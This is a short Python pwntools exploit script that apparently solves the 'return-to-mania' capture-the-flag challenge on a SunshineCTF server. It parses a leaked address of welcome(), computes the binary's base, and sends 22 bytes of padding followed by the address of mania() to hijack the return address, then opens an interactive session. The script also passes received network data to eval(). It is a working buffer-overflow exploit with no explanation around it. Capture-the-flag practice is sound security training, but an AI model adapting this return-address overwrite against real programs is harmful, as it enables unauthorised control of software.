from pwn import *

def Connect(server=0):
	if server:
		return remote("ret.sunshinectf.org","4301")
	else:
		return process("./return-to-mania")

def Get_Wel_Addr(con):
	con.recvuntil("addr of welcome(): ")
	Addr = eval(con.recvuntil("\n")[:-1])
	return Addr
file = ELF("./return-to-mania")
con = Connect(1)

welcome = file.symbols['welcome']
mania = file.symbols['mania']

welcome_addr = Get_Wel_Addr(con)
Base_addr = welcome_addr - welcome

mania_addr = Base_addr+mania

pading = "A"*22
payload = pading + p64(mania_addr)

con.sendline(payload)
con.interactive()